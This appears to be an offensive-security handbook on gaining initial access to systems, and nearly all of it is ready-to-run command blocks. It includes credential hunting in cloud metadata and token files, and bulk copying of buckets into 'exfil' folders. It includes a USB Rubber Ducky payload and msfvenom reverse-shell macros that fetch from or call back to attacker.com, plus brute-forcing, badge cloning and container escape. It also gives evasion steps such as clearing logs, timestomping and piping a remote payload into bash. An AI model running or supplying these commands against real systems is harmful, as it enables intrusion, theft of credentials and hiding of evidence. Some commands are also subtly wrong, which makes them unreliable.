# Initial Access: Modern Attack Vectors and Techniques

## Overview

Initial access represents the first stage of a cyber attack, where adversaries gain their foothold in target systems. Modern initial access techniques have evolved to exploit supply chain vulnerabilities, cloud misconfigurations, and sophisticated social engineering, making them particularly effective against today's distributed architectures.

## Supply Chain Compromise

### Software Supply Chain Attacks

Modern attackers increasingly target software supply chains to achieve broad initial access across multiple organizations.

#### Package Repository Attacks

**NPM Package Typosquatting**
```bash
# Search for popular packages with potential typosquat opportunities
npm search express --json | jq '.[] | select(.name | contains("express")) | .name' | head -20

# Create typosquat package (for educational purposes)
mkdir express-middleware && cd express-middleware
npm init -y

# Analyze legitimate package downloads
npm view express versions --json
npm view express dist-tags

# Monitor package installations (defenders)
npm audit --audit-level moderate
npm ls --depth=0
```

**PyPI Supply Chain Investigation**
```bash
# Search for suspicious packages
pip search "requests" | grep -E "(request|reqeust|reuqest)"

# Analyze package metadata
pip show requests
pip show --verbose suspicious-package-name

# Check package dependencies
pipdeptree --packages suspicious-package-name

# Verify package signatures (when available)
pip install --trusted-host pypi.org --trusted-host pypi.python.org requests
```

#### Container Supply Chain Attacks

**Docker Hub Reconnaissance**
```bash
# Search for official vs unofficial images
docker search nginx --limit 25 --format "table {{.Name}}\t{{.Stars}}\t{{.Official}}"

# Analyze suspicious images
docker pull suspicious/image:latest
docker history suspicious/image:latest
docker inspect suspicious/image:latest | jq '.Config.Env'

# Extract and analyze image layers
docker save suspicious/image:latest -o image.tar
tar -xf image.tar
cat manifest.json | jq '.'

# Scan for vulnerabilities
trivy image suspicious/image:latest
grype suspicious/image:latest
```

**Kubernetes Supply Chain Attacks**
```bash
# Search for vulnerable Helm charts
helm search repo --devel | grep -E "(backup|monitor|logging)"

# Analyze chart contents
helm pull bitnami/mysql --untar
find mysql/ -name "*.yaml" -exec grep -l "privileged\|hostPath\|hostNetwork" {} \;

# Check for suspicious container registries
kubectl get pods -o jsonpath='{range .items[*]}{.spec.containers[*].image}{"\n"}{end}' | sort -u

# Monitor for supply chain indicators
kubectl get events --field-selector type=Warning
kubectl logs -l app=suspicious-app --tail=100
```

### Cloud Service Provider Attacks

#### AWS Initial Access

**S3 Bucket Enumeration**
```bash
# Install AWS CLI tools
pip install awscli boto3

# Enumerate public S3 buckets
aws s3 ls s3://company-name-backup --no-sign-request
aws s3 ls s3://companyname-logs --no-sign-request

# Common bucket naming patterns
for prefix in backup logs data archive dev test staging prod; do
    aws s3 ls s3://${company}-${prefix} --no-sign-request 2>/dev/null && echo "Found: ${company}-${prefix}"
done

# Download accessible bucket contents
aws s3 sync s3://vulnerable-bucket ./exfil --no-sign-request

# Search for credentials in downloaded files
grep -r "aws_access_key_id\|aws_secret_access_key\|password\|token" ./exfil/
```

**AWS Credential Hunting**
```bash
# Search for exposed credentials
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>/dev/null
curl -s "http://169.254.169.254/latest/user-data" 2>/dev/null

# Check common credential locations
find /home -name ".aws" 2>/dev/null
find /var/log -name "*.log" -exec grep -l "AWS\|aws" {} \; 2>/dev/null

# Environment variable hunting
env | grep -i aws
cat /proc/*/environ 2>/dev/null | grep -a "AWS"

# Test discovered credentials
aws sts get-caller-identity
aws sts get-session-token --duration-seconds 3600
```

#### Azure Initial Access

**Azure Blob Storage Discovery**
```bash
# Install Azure CLI
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# Enumerate public blob containers
az storage blob list --account-name companyname --container-name '$web' --output table 2>/dev/null

# Common storage account patterns
for suffix in backup logs data files assets; do
    az storage account show --name company${suffix} --output table 2>/dev/null
done

# Download accessible blobs
az storage blob download-batch --destination ./azure-exfil --source publiccontainer --account-name companyname

# Search for Azure credentials
grep -r "DefaultAzureCredential\|azure_client_id\|tenant_id" ./azure-exfil/
```

**Azure AD Token Abuse**
```bash
# Check for existing Azure tokens
ls -la ~/.azure/
cat ~/.azure/accessTokens.json 2>/dev/null

# Extract tokens from browsers (Linux)
find ~/.config -name "*.json" -exec grep -l "access_token" {} \; 2>/dev/null

# Test discovered tokens
az account list --all
az ad user list --output table
```

#### GCP Initial Access

**Google Cloud Storage Enumeration**
```bash
# Install Google Cloud SDK
curl https://sdk.cloud.google.com | bash

# Enumerate public buckets
gsutil ls gs://company-name-backups 2>/dev/null
gsutil ls gs://companyname-logs 2>/dev/null

# Download accessible bucket contents
gsutil -m cp -r gs://public-bucket ./gcp-exfil/

# Check bucket permissions
gsutil iam get gs://target-bucket

# Search for GCP credentials
grep -r "service_account\|private_key\|client_email" ./gcp-exfil/
find . -name "*.json" -exec jq -r 'select(.type=="service_account") | .client_email' {} \; 2>/dev/null
```

### Code Repository Attacks

#### GitHub Intelligence Gathering

**Repository Reconnaissance**
```bash
# Install GitHub CLI
curl -fsSL https://cli.github.com/packages/githubcli-archive-keyring.gpg | sudo gpg --dearmor -o /usr/share/keyrings/githubcli-archive-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/githubcli-archive-keyring.gpg] https://cli.github.com/packages stable main" | sudo tee /etc/apt/sources.list.d/github-cli.list
sudo apt update && sudo apt install gh

# Search for exposed secrets
gh api search/code --method GET -f q="password in:file repo:target-org" --paginate | jq '.items[].html_url'
gh api search/code --method GET -f q="api_key in:file repo:target-org" --paginate | jq '.items[].html_url'
gh api search/code --method GET -f q="private_key in:file repo:target-org" --paginate | jq '.items[].html_url'

# Find configuration files
gh api search/code --method GET -f q="filename:.env repo:target-org" --paginate | jq '.items[].html_url'
gh api search/code --method GET -f q="filename:config.json repo:target-org" --paginate | jq '.items[].html_url'

# Analyze commit history for secrets
git log --all --grep="password\|secret\|key" --oneline
git log -S"password" --all --oneline
```

**TruffleHog Secret Scanning**
```bash
# Install TruffleHog
pip install truffleHog3

# Scan GitHub repository
truffleHog3 https://github.com/target-org/target-repo

# Scan local repository
truffleHog3 --local /path/to/repo

# Custom regex patterns
echo 'AWS_ACCESS_KEY = "[A-Z0-9]{20}"' >> custom_regexes.json
truffleHog3 --rules custom_regexes.json https://github.com/target-org/target-repo
```

#### GitLab and Self-Hosted Git

**GitLab API Enumeration**
```bash
# Create access token (if you have account)
# Navigate to GitLab > Settings > Access Tokens

# List accessible projects
curl --header "PRIVATE-TOKEN: your-token" "https://gitlab.example.com/api/v4/projects"

# Search for files containing secrets
curl --header "PRIVATE-TOKEN: your-token" "https://gitlab.example.com/api/v4/search?scope=blobs&search=password"

# Download repository
git clone https://oauth2:your-token@gitlab.example.com/group/project.git
```

**Gitleaks Secret Detection**
```bash
# Install Gitleaks
wget https://github.com/zricethezav/gitleaks/releases/download/v8.15.2/gitleaks_8.15.2_linux_x64.tar.gz
tar -xzf gitleaks_8.15.2_linux_x64.tar.gz
sudo mv gitleaks /usr/local/bin/

# Scan repository for secrets
gitleaks detect --source /path/to/repo
gitleaks detect --source https://github.com/target/repo

# Generate report
gitleaks detect --source /path/to/repo --report-format json --report-path secrets-report.json

# Custom configuration
cat > .gitleaks.toml << 'EOF'
[[rules]]
id = "aws-access-key"
description = "AWS Access Key"
regex = '''AKIA[0-9A-Z]{16}'''
tags = ["aws", "credentials"]

[[rules]]
id = "private-key"
description = "Private Key"
regex = '''-----BEGIN .* PRIVATE KEY-----'''
tags = ["private-key"]
EOF

gitleaks detect --config .gitleaks.toml --source /path/to/repo
```

## Web Application Attacks

### Modern Web Attack Vectors

#### GraphQL Exploitation

**GraphQL Introspection and Enumeration**
```bash
# Install GraphQL tools
npm install -g graphql-cli
pip install graphql-core

# Introspection query
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name type { name } } } } }"}'

# Query depth analysis
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query { users { posts { comments { author { posts { comments { id } } } } } } }"}'

# Batch query attack
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "query { user(id: 1) { name email } }"},
    {"query": "query { user(id: 2) { name email } }"},
    {"query": "query { user(id: 3) { name email } }"}
  ]'
```

**GraphQL Enumeration with graphw00f**
```bash
# Install graphw00f
pip install graphw00f

# Detect GraphQL endpoint
graphw00f -f -t http://target.com/

# Fingerprint GraphQL implementation
graphw00f -f -t http://target.com/graphql

# Test common endpoints
for endpoint in graphql api/graphql v1/graphql query; do
    graphw00f -f -t http://target.com/$endpoint
done
```

#### API Security Testing

**REST API Enumeration**
```bash
# Install essential tools
sudo apt install gobuster feroxbuster ffuf

# Discover API endpoints
gobuster dir -u http://target.com/api -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x json,xml

# API fuzzing with ffuf
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt -u http://target.com/api/FUZZ

# Discover API versions
for version in v1 v2 v3 api/v1 api/v2; do
    curl -s -o /dev/null -w "%{http_code}" http://target.com/$version && echo "Found: $version"
done
```

**OpenAPI/Swagger Analysis**
```bash
# Download OpenAPI specification
curl -s http://target.com/swagger.json > swagger.json
curl -s http://target.com/openapi.json > openapi.json
curl -s http://target.com/api-docs > api-docs.json

# Analyze API specification
jq '.paths' swagger.json | jq 'keys[]'
jq '.paths | to_entries[] | select(.value | has("post"))' swagger.json

# Test API endpoints from specification
cat swagger.json | jq -r '.paths | keys[]' | while read endpoint; do
    curl -s -o /dev/null -w "%-30s %s\n" "$endpoint" "$(curl -s -o /dev/null -w "%{http_code}" http://target.com$endpoint)"
done
```

### Social Engineering with Technical Components

#### Phishing Infrastructure Setup

**Domain Setup and DNS**
```bash
# Check domain availability
whois suspicious-domain.com
dig suspicious-domain.com ANY

# Setup subdomain takeover testing
subfinder -d target.com -silent | httpx -silent -status-code -title

# Check for dangling DNS records
dig target.com CNAME
dig subdomain.target.com A

# Certificate transparency logs
curl -s "https://crt.sh/?q=target.com&output=json" | jq -r '.[].name_value' | sort -u
```

**Email Infrastructure**
```bash
# Check email security records
dig target.com TXT | grep -E "v=spf1|v=DMARC1"
dig _dmarc.target.com TXT
dig default._domainkey.target.com TXT

# Test email spoofing potential
echo "Testing SPF bypass" | mail -s "Test" -r "admin@target.com" target@victim.com

# Verify email deliverability
mail-tester.com # Web service for testing
```

#### Social Engineering Payloads

**USB Rubber Ducky Payloads**
```bash
# Install ducky script compiler
git clone https://github.com/hak5darren/USB-Rubber-Ducky.git
cd USB-Rubber-Ducky

# Basic credential harvester payload
cat > credential_harvest.txt << 'EOF'
DELAY 2000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/harvest.ps1')"
ENTER
EOF

# Compile payload
java -jar duckencode.jar -i credential_harvest.txt -o inject.bin
```

**Malicious Office Documents**
```bash
# Install msfvenom
sudo apt install metasploit-framework

# Create malicious macro payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f vba-exe -o payload.vba

# Create malicious HTA file
msfvenom -p windows/shell_reverse_tcp LHOST=attacker.com LPORT=4444 -f hta-psh -o malicious.hta

# Office document with embedded payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f vba -o macro.vba
```

## Physical Access Attacks

### Hardware-Based Initial Access

#### RFID/Badge Cloning

**Proxmark3 Operations**
```bash
# Install Proxmark3 client
sudo apt install proxmark3

# Connect to device
proxmark3 /dev/ttyACM0

# Low frequency card operations
proxmark3> lf search
proxmark3> lf hid clone --fmt 26 --fc 123 --cn 1337
proxmark3> lf hid sim --fmt 26 --fc 123 --cn 1337

# High frequency operations
proxmark3> hf search
proxmark3> hf mf autopwn
proxmark3> hf mf cload backup.bin
```

**Flipper Zero Badge Cloning**
```bash
# Sub-GHz frequency analysis
# Navigate to Sub-GHz -> Read
# Analyze captured signals
# Save and replay signals

# RFID/NFC operations
# Navigate to NFC -> Read card
# Save card data
# Emulate saved cards

# BadUSB payloads
# Navigate to BadUSB -> Create payload
# Execute HID attacks
```

#### Network Access Control Bypass

**NAC Bypass Techniques**
```bash
# MAC address spoofing
ifconfig eth0 down
macchanger -r eth0
ifconfig eth0 up

# Copy MAC from authorized device
macchanger -m 00:11:22:33:44:55 eth0

# 802.1X bypass with hostapd-wpe
git clone https://github.com/aircrack-ng/hostapd-wpe.git
cd hostapd-wpe
make

# Create rogue access point
hostapd-wpe hostapd-wpe.conf
```

**VLAN Hopping**
```bash
# Install VLAN tools
sudo apt install vlan

# Create VLAN interface
vconfig add eth0 100
ifconfig eth0.100 192.168.100.10 netmask 255.255.255.0 up

# Double tagging attack
vconfig add eth0 10
vconfig add eth0.10 20
ifconfig eth0.10.20 192.168.20.10 netmask 255.255.255.0 up
```

## Remote Access and VPN Attacks

### VPN Security Testing

#### OpenVPN Exploitation**
```bash
# Enumerate OpenVPN service
nmap -sV -p 1194 target.com
nmap -sU -p 1194 target.com

# Test for user enumeration
openvpn-brute.py --host target.com --port 1194 --users userlist.txt

# Certificate analysis
openssl x509 -in client.crt -text -noout
openssl rsa -in client.key -text -noout
```

**IPSec VPN Attacks**
```bash
# Install ike-scan
sudo apt install ike-scan

# Enumerate IKE services
ike-scan -M target.com
ike-scan -A target.com
ike-scan --showbackoff target.com

# Aggressive mode attack
ike-scan -M -A target.com

# PSK cracking with hashcat
hashcat -m 5600 captured_hash.txt wordlist.txt
```

### RDP and Remote Desktop Attacks

**RDP Enumeration and Exploitation**
```bash
# RDP service detection
nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 target.com

# RDP brute force
hydra -L users.txt -P passwords.txt rdp://target.com
ncrack -vv --user administrator -P passwords.txt rdp://target.com

# RDP session hijacking (if admin access)
query session
tscon 2 /dest:rdp-tcp#0
```

**SSH Key-Based Attacks**
```bash
# SSH user enumeration
ssh-keyscan -t rsa target.com
enum4linux target.com

# SSH key discovery
find /home -name "*.pub" 2>/dev/null
find /home -name "id_*" 2>/dev/null
find /root/.ssh -name "*" 2>/dev/null

# Weak SSH key detection
ssh-badkeys -a /path/to/authorized_keys
```

## Advanced Persistence Techniques

### Container Escape for Initial Access

#### Docker Escape Techniques

**Privileged Container Detection**
```bash
# Check if running in container
if [ -f /.dockerenv ]; then
    echo "Inside Docker container"
fi

# Check for privileged mode
if [ -c /dev/kmsg ]; then
    echo "Privileged container detected"
fi

# Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host 2>/dev/null && echo "Host filesystem mounted"

# Escape via cgroups (if writable)
echo 1 > /sys/fs/cgroup/cgroup.procs
```

**Kubernetes Pod Escape**
```bash
# Check service account permissions
kubectl auth can-i --list
kubectl get secrets
kubectl get pods --all-namespaces

# Access host network
if ip route | grep -q "10.96.0.0/12"; then
    echo "Kubernetes cluster network detected"
fi

# Mount host paths
ls -la /host-root 2>/dev/null
ls -la /var/run/docker.sock 2>/dev/null
```

## Detection Evasion

### Anti-Forensics Techniques

**Log Evasion**
```bash
# Clear common log files
> /var/log/auth.log
> /var/log/syslog
> /var/log/messages
> ~/.bash_history

# Disable history logging
export HISTFILE=/dev/null
export HISTSIZE=0
set +o history

# Timestamp manipulation
touch -r /bin/ls malicious_file.sh
touch -t 202301010000 backdoor.py
```

**Process Hiding**
```bash
# Run in background with nohup
nohup ./backdoor &

# Process hiding with different names
exec -a "systemd-daemon" ./backdoor

# Memory-only execution
curl -s http://attacker.com/payload.sh | bash
```

## Tool Integration and Automation

### Automated Initial Access Frameworks

**AutoRecon**
```bash
# Install AutoRecon
pip3 install autorecon

# Comprehensive target reconnaissance
autorecon target.com

# Network range scanning
autorecon 192.168.1.0/24

# Custom port scanning
autorecon --ports "80,443,8080,8443" target.com
```

**Nuclei Vulnerability Scanner**
```bash
# Install Nuclei
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest

# Basic vulnerability scan
nuclei -u https://target.com

# Specific template categories
nuclei -u https://target.com -t exposures/
nuclei -u https://target.com -t misconfiguration/

# Custom template directory
nuclei -u https://target.com -t /path/to/custom-templates/

# Output formats
nuclei -u https://target.com -json -o results.json
```

**Reconftw Complete Reconnaissance**
```bash
# Install reconftw
git clone https://github.com/six2dez/reconftw.git
cd reconftw && ./install.sh

# Full reconnaissance
./reconftw.sh -d target.com -a

# Specific modes
./reconftw.sh -d target.com -r  # Recon only
./reconftw.sh -d target.com -s  # Subdomain enum only
./reconftw.sh -d target.com -v  # Vulnerability assessment
```

## Defensive Countermeasures

### Initial Access Prevention

**Endpoint Detection**
```bash
# Sysmon installation and configuration
# Download Sysmon from Microsoft Sysinternals
sysmon64.exe -accepteula -i sysmonconfig.xml

# YARA rule deployment
yara rules.yar /path/to/scan/

# Process monitoring
wmic process list full
wmic service list full
```

**Network Monitoring**
```bash
# Zeek network analysis
zeek -i eth0 local.zeek

# Suricata IDS
suricata -c /etc/suricata/suricata.yaml -i eth0

# Network baseline establishment
ntopng -i eth0 -P /etc/ntopng.conf
```

**Threat Hunting Queries**
```bash
# Hunt for supply chain indicators
grep -r "npm install\|pip install\|git clone" /var/log/

# Monitor for credential access
grep -i "credentials\|password\|token" /var/log/auth.log

# Detect container escapes
grep "mounted\|escape\|breakout" /var/log/syslog
```

## References and Resources

- [MITRE ATT&CK Initial Access](https://attack.mitre.org/tactics/TA0001/)
- [OWASP Top 10 API Security Risks](https://owasp.org/www-project-api-security/)
- [NIST Supply Chain Security Framework](https://csrc.nist.gov/Projects/supply-chain-risk-management)
- [Container Security Best Practices](https://kubernetes.io/docs/concepts/security/)
- [Physical Security Testing Guide](https://github.com/devttys0/hardware)